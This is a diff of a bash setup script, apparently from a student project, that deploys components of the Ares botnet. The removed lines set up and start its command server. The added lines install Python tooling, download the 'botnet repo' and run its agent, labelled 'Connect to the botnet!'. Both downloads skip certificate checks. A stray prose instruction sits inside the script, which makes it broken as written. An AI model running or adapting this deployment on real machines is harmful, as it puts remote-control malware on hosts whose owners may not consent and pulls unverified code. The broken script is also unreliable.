@@ -1,17 +1,20 @@
 #! /bin/bash
+# Start from scratch 12/5/2016
 
-IP=$(ip route get 8.8.8.8 | awk '{print $NF; exit}')
+1) edit the sources.list file and add old repo's & python PPA
 
-apt-get update
-apt-get install python2.6 python-pip -y
+sudo apt-get update
+sudo apt-get install git git-core ssh python2.6
 
-pip install --upgrade pip
-pip install cherrypy
+# Install pip for Python 2.6
+wget https://bootstrap.pypa.io/get-pip.py --no-check-certificate && sudo python2.6 get-pip.py
 
-cd ~ && git clone https://github.com/kmanwar89/460SP.git
-cd ~/460SP/Ares/server/conf/
-sed -i "s/127.0.0.1/$IP/g" server.conf
-cd ~/460SP/Ares/server/ && python db_init.py
-cd ~/460SP/Ares/agent/python/ && sed -i "s/localhost/$IP/g" settings.py
-chown -R checkout:checkout ~/460SP/
-cd ~/460SP/Ares/server/ && python server.py
+# Install Python Requests library
+sudo pip install --upgrade pip && sudo pip install requests
+
+# Clone the botnet repo
+cd ~ && wget https://github.com/kmanwar89/460SP/archive/master.zip --no-check-certificate
+mv master master.zip && unzip master.zip
+
+# Connect to the botnet!
+cd 460SP-master/Ares/agent/python && python2.6 agent.py
